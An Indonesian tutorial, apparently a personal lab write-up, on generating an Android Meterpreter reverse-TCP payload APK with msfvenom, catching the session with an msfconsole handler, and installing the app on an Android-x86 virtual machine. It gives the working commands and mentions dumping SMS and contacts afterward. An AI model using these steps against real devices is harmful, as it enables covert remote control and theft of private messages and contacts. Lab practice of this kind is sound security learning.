# Membuat payload android dengan msfvenom

Dalam metasploit framework ada salah satu alat yang berfungsi untuk membuat payload (malicious code / shellcode) yaitu msfvenom. Msfvenom biasa digunakn untuk tujuan penetration testing terkontrol hingga exploit development karena penggunaanya yang mudah dan fungsi yang luas. Namun karena Metasploit merupakan framework berbasis open-source, payload yang dihasilkan oleh msfvenom menjadi mudah dikenali. Oleh karena itu payload ini jarang digunakan dalam penetration testing profesional karena anti-virus dan sistem keamanan lainnya dapat mengenali signaturenya dengan mudah.

Saya akan mencoba membuat payload android dengan msfvenom dan menggunakannya di virtual machine Android-x86 

## Membuat payload 

Untuk membuat shellcode android dengan msfvenom kita dapat menggunakan payload */android/meterpreter/reverse_tcp* yang akan membuat sebuah file aplikasi yang berisi payload reverse shell menggunakan protokol tcp.

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP_tujuan> LPORT=<PORT_tujuan> -o <hasil_output>
```
setelah selesai hasil nya akan berupa aplikasi yang akan diinstall di perangkat target

## Menjalankan aplikasi di Android

Pertama saya akan menjalankan sesi di msfconsole agar dapat menerima reverse shell dari perangkat target

```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST=<IP_tujuan>
set LPORT=<PORT_tujuan>
exploit
```
Maka metasploit akan menunggu koneksi dari perangkat target

![Gambar membuka-sesi](assets/img/buka-sesi.png)

Setelah berhasil menjalankan sesi di msfconsole, saya akan menginstall aplikasi pada android target yang akan menjalankan payload tersebut. disini saya menggunakan Android-x86 dengan os android 9 yang saya jalankan di virtual machine. saya menginstall aplikasi tersebut melalui adb agar mudah dan cepat.

![Gambar Android-x86](assets/img/adb-install.png)

Saatnya menjalankan aplikasi. PENTING!!! jika sesi tidak terbuka otomatis artinya aplikasi butuh one-click untuk menjalankan payload, aplikasi akan muncul dengan nama main activity setelah target meng klik maka sesi akan terbuka di msfconsole 

![gambar mainacti](assets/img/main-activity.png)

![gambar sesi-connect](assets/img/sesi-connect.png)

Terakhir kita bisa mengeksplorasi fitur fitur seperti dump sms, dump contact, screenshoot, membuka layanan, dll. 
